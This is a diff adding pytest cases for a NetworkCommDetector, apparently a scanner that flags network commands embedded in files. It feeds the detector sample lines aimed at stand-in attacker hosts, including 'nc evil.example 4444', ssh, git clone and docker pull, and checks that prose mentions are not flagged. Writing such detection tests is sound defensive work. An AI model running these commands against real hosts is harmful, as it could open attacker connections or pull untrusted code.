@@ -864,6 +864,83 @@ class TestNetworkCommDetector:
 
         assert not [finding for finding in findings if finding["type"] == "network_command"]
 
+    @pytest.mark.parametrize(
+        ("command", "command_type", "destination"),
+        [
+            (b"git clone https://evil.example/repo.git", "git_clone", "https://evil.example/repo.git"),
+            (
+                b"git clone --depth 1 https://user:secret@evil.example/repo.git checkout",
+                "git_clone",
+                "https://evil.example/repo.git",
+            ),
+            (b"git clone git@evil.example:owner/repo.git", "git_clone", "git@evil.example:owner/repo.git"),
+            (b"ssh user@evil.example", "ssh", "user@evil.example"),
+            (b"ssh -vvv -p2222 user@evil.example", "ssh", "user@evil.example"),
+            (b"docker pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
+            (b"docker image pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
+            (
+                b"docker pull --platform linux/amd64 evil.example/model:latest",
+                "docker_pull",
+                "evil.example/model:latest",
+            ),
+        ],
+    )
+    def test_detect_explicit_network_commands(
+        self,
+        command: bytes,
+        command_type: str,
+        destination: str,
+    ) -> None:
+        detector = NetworkCommDetector()
+
+        findings = detector.scan(command + b"\n")
+
+        assert any(
+            finding["type"] == "network_command"
+            and finding["command_type"] == command_type
+            and finding["destination"] == destination
+            and finding["severity"] == "HIGH"
+            for finding in findings
+        )
+
+    def test_detect_explicit_network_commands_with_crlf(self) -> None:
+        detector = NetworkCommDetector()
+
+        findings = detector.scan(
+            b"nc evil.example 4444\r\n"
+            b"ssh user@evil.example\r\n"
+            b"git clone https://evil.example/repo.git\r\n"
+            b"docker pull evil.example/model:latest\r\n"
+        )
+
+        assert {
+            finding.get("command_type", "netcat") for finding in findings if finding["type"] == "network_command"
+        } == {
+            "netcat",
+            "ssh",
+            "git_clone",
+            "docker_pull",
+        }
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            b"The git clone command is documented at https://git-scm.com/docs/git-clone.\n",
+            b"git clone https://attacker.com/repo.git is documented here\n",
+            b"The ssh client connects to remote systems.\n",
+            b"ssh attacker.com is documented here\n",
+            b"Docker pull documentation: https://docs.docker.com/reference/cli/docker/image/pull/.\n",
+            b"docker pull attacker.com/model:latest is documented here\n",
+            b"git clone https://" + b"a" * 10000 + b" prose tail\n",
+        ],
+    )
+    def test_network_command_prose_is_not_explicit_command(self, content: bytes) -> None:
+        detector = NetworkCommDetector()
+
+        findings = detector.scan(content)
+
+        assert not [finding for finding in findings if finding["type"] == "network_command"]
+
     def test_ml_word_inside_real_domain_is_still_detected(self) -> None:
         """DNS-shaped endpoints containing ML terms should not be suppressed."""
         detector = NetworkCommDetector()
